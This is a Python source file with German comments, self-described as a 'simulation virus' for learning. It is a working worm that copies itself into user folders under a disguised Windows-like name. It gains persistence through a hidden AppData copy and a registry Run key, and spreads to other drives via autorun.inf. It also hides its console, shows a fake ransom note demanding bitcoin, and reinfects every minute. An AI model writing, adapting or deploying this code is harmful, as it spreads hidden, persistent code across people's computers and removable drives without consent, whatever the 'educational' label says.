"""
SIM-VIRUS — Selbstreplizierend, persistent, mit USB-Vektor & Payload.
Zum Lernen. Kein Datenverlust. Stop via Task-Manager.
"""
import os, sys, shutil, time, random, string, subprocess, platform, ctypes

WINDOWS = platform.system() == "Windows"
NAME    = "svchost32.py"          # Tarnname (ähnlich echtem Windows-Prozess)
MARKER  = ".infected"             # Anti-Reinfektions-Marker
TARGETS = [
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Desktop"),
]

# ─────────────────────────────────────────────────────────────
# 1. SELBSTREPLIKATION
# ─────────────────────────────────────────────────────────────
def replicate():
    src = os.path.abspath(sys.argv[0])
    for target in TARGETS:
        if not os.path.isdir(target):
            continue
        dest_dir = os.path.join(target, "System Volume Information")
        dest = os.path.join(dest_dir, NAME)
        try:
            os.makedirs(dest_dir, exist_ok=True)
            if not os.path.exists(dest):
                shutil.copy2(src, dest)
                os.chmod(dest, 0o777)
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────
# 2. PERSISTENZ  (Autostart)
# ─────────────────────────────────────────────────────────────
def persist():
    if not WINDOWS:
        return
    src = os.path.abspath(sys.argv[0])
    # Kopie im AppData-Verzeichnis (unauffällig)
    appdata = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Explorer")
    os.makedirs(appdata, exist_ok=True)
    hidden = os.path.join(appdata, NAME)
    try:
        shutil.copy2(src, hidden)
        ctypes.windll.kernel32.SetFileAttributesW(hidden, 0x02)  # HIDDEN
    except Exception:
        hidden = src
    # Registry-Run-Key
    key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    subprocess.run(
        ["reg", "add", key, "/v", "WindowsExplorerHelper", "/t", "REG_SZ",
         "/d", f'pythonw "{hidden}"' if src.endswith(".py") else f'"{hidden}"',
         "/f"],
        capture_output=True
    )

# ─────────────────────────────────────────────────────────────
# 3. USB-VEKTOR  (Verbreitung)
# ─────────────────────────────────────────────────────────────
def spread_usb():
    if not WINDOWS:
        return
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    usb = [d for d in drives if d != os.path.abspath(sys.argv[0])[:2] + "\\"]
    for d in usb:
        payload = os.path.join(d, NAME)
        autorun  = os.path.join(d, "autorun.inf")
        try:
            if not os.path.exists(payload):
                shutil.copy2(os.path.abspath(sys.argv[0]), payload)
                with open(autorun, "w") as f:
                    f.write(f'[AutoRun]\nopen={NAME}\nicon=shell32.dll,13\n')
                ctypes.windll.kernel32.SetFileAttributesW(payload, 0x02)
                ctypes.windll.kernel32.SetFileAttributesW(autorun, 0x02)
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────
# 4. PAYLOAD  (Fake-Ransomware-Fenster)
# ─────────────────────────────────────────────────────────────
def payload():
    if not os.path.exists(MARKER):
        open(MARKER, "w").close()
        if WINDOWS:
            msg = ("🦠 DEIN SYSTEM WURDE VERSCHLÜSSELT\n\n"
                   "Alle Dateien sind gesperrt.\n"
                   "Sende 0.5 BTC an: 1FakeAddrXXXXXXXXXXXXXXXX\n\n"
                   "— sim-virus v1.0")
            subprocess.Popen(["mshta", f"javascript:alert('{msg}');"])
        else:
            subprocess.Popen(["xmessage", "-center", "SYSTEM INFECTED"])

# ─────────────────────────────────────────────────────────────
# 5. HIDE + MAIN
# ─────────────────────────────────────────────────────────────
def hide_console():
    if WINDOWS:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    if not os.path.exists(MARKER):
        hide_console()
    replicate()
    persist()
    spread_usb()
    payload()

    # Watchdog: alle 60s erneut verbreiten + neu infizieren falls gelöscht
    while True:
        time.sleep(60)
        replicate()
        spread_usb()

if __name__ == "__main__":
    main()